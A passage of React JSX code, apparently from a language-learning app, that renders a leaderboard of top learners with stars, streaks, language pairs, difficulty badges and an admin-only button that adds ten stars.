                              <span className="text-[11px] font-extrabold px-2.5 py-0.5 rounded-full bg-amber-500/20 text-amber-600 dark:text-amber-300">
                                {rankTitle}
                              </span>
                            </div>

                            <div>
                              <div className="font-display font-extrabold text-base sm:text-lg truncate">
                                👤 {leader.displayName}
                              </div>
                              <div className="text-xs font-bold opacity-75 truncate mt-0.5">
                                {leader.nativeLangName} → {leader.targetLangName}
                              </div>
                            </div>

                            <div className="flex items-center justify-between pt-2 border-t border-slate-200/70 dark:border-slate-700/70">
                              <span className="inline-flex items-center gap-1 font-display font-extrabold text-sm sm:text-base text-amber-500">
                                <Star className="w-4 h-4 fill-amber-400 text-amber-400" />
                                <span>{mt.starsCountLabel(leader.stars)}</span>
                              </span>
                              <span className="text-xs font-extrabold text-orange-500">
                                {mt.streakDaysCount(leader.streakDays)}
                              </span>
                            </div>
                          </div>
                        );
                      })}
                    </div>
                  )}

                  {/* Full Top 10 Ranked Table */}
                  <div className="space-y-2.5">
                    <div className="flex items-center justify-between">
                      <h5 className="font-display font-extrabold text-sm sm:text-base flex items-center gap-2">
                        <Sparkles className="w-4 h-4 text-amber-400" />
                        <span>{mt.top10ListHeading(topTenLearners.length)}</span>
                      </h5>
                    </div>

                    <div className="space-y-2.5">
                      {topTenLearners.map((learner, index) => {
                        const rank = index + 1;
                        const maxStars = Math.max(1, topTenLearners[0]?.stars || 1);
                        const barWidthPct = Math.max(
                          8,
                          Math.min(100, Math.round(((learner.stars || 0) / maxStars) * 100))
                        );
                        const isCurrentUserRow =
                          learner.uid === 'local_learner' ||
                          (currentUser && learner.uid === currentUser.uid);

                        return (
                          <div
                            key={`rank-${learner.uid}`}
                            className={`p-3.5 sm:p-4 rounded-2xl border-2 flex flex-wrap items-center justify-between gap-3 transition-all ${
                              rank === 1
                                ? isDark
                                  ? 'bg-amber-950/35 border-amber-500/60'
                                  : 'bg-amber-50/70 border-amber-300'
                                : isDark
                                ? 'bg-slate-800/80 border-slate-700'
                                : 'bg-white border-slate-200 shadow-xs'
                            }`}
                          >
                            <div className="flex items-center gap-3 min-w-0 flex-1">
                              {/* Rank Number / Medal */}
                              <div
                                className={`w-10 h-10 rounded-2xl font-display font-extrabold text-sm sm:text-base flex items-center justify-center shrink-0 ${
                                  rank === 1
                                    ? 'bg-gradient-to-b from-amber-300 to-amber-500 text-slate-950 shadow-sm'
                                    : rank === 2
                                    ? 'bg-gradient-to-b from-slate-200 to-slate-400 text-slate-950'
                                    : rank === 3
                                    ? 'bg-gradient-to-b from-orange-300 to-amber-600 text-slate-950'
                                    : isDark
                                    ? 'bg-slate-700 text-slate-200'
                                    : 'bg-slate-100 text-slate-700'
                                }`}
                              >
                                {rank === 1
                                  ? '🥇'
                                  : rank === 2
                                  ? '🥈'
                                  : rank === 3
                                  ? '🥉'
                                  : `#${rank}`}
                              </div>

                              <div className="min-w-0 flex-1 space-y-1">
                                <div className="flex items-center gap-2 flex-wrap">
                                  <span className="font-display font-extrabold text-sm sm:text-base truncate">
                                    {learner.displayName}
                                  </span>
                                  {isCurrentUserRow && (
                                    <span className="px-2 py-0.5 rounded-full text-[10px] font-extrabold bg-emerald-500 text-white">
                                      {mt.youBadge}
                                    </span>
                                  )}
                                  <span className="px-2.5 py-0.5 rounded-full text-[11px] font-extrabold bg-sky-500/15 text-sky-600 dark:text-sky-300">
                                    {learner.nativeLangName} → {learner.targetLangName}
                                  </span>
                                  <span
                                    className={`px-2 py-0.5 rounded-full text-[10px] font-extrabold ${
                                      learner.difficultyLevel === 'hard'
                                        ? 'bg-rose-500/20 text-rose-500'
                                        : learner.difficultyLevel === 'medium'
                                        ? 'bg-amber-500/20 text-amber-500'
                                        : 'bg-emerald-500/20 text-emerald-500'
                                    }`}
                                  >
                                    {learner.difficultyLevel.toUpperCase()}
                                  </span>
                                </div>

                                {/* Stars Relative Progress Bar */}
                                <div className="w-full max-w-md h-2 rounded-full bg-slate-200 dark:bg-slate-700 overflow-hidden">
                                  <div
                                    className="h-full rounded-full bg-gradient-to-r from-amber-400 to-orange-500 transition-all duration-500"
                                    style={{ width: `${barWidthPct}%` }}
                                  />
                                </div>

                                <div className="flex flex-wrap items-center gap-3 text-[11px] text-slate-500 dark:text-slate-400 font-bold">
                                  <span>{mt.statStreak(learner.streakDays)}</span>
                                  <span>
                                    {mt.statWords(
                                      learner.wordsCompleted,
                                      learner.wordsTotal
                                    )}
                                  </span>
                                  <span>
                                    {mt.statConversation(
                                      learner.conversationsCompleted,
                                      learner.conversationsTotal
                                    )}
                                  </span>
                                </div>
                              </div>
                            </div>

                            {/* Right Side: Total Stars Badge + Optional Admin Star Boost */}
                            <div className="flex items-center gap-2 shrink-0">
                              <div className="px-3.5 py-2 rounded-2xl bg-gradient-to-b from-amber-400 to-orange-500 text-slate-950 font-display font-extrabold text-xs sm:text-sm shadow-[0_3px_0_#B45309] flex items-center gap-1.5">
                                <Star className="w-4 h-4 fill-slate-950 text-slate-950" />
                                <span>{mt.starsCountLabel(learner.stars)}</span>
                              </div>

                              {canOpenAdminPanel && (
                                <button
                                  type="button"
                                  onClick={() =>
                                    handleAdminBoostLearner(
                                      learner,
                                      { stars: (learner.stars || 0) + 10 },
                                      `⭐ ${learner.displayName}: +10 ⭐`
                                    )
                                  }
                                  className="px-2.5 py-2 rounded-xl bg-sky-500/20 hover:bg-sky-500/30 text-sky-500 text-xs font-extrabold cursor-pointer"
                                  title="+10 ⭐"
                                >
                                  +10 ⭐
                                </button>
                              )}
                            </div>
                          </div>
                        );
                      })}
                    </div>
                  </div>
                </div>
              )}
            </div>
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  );
}
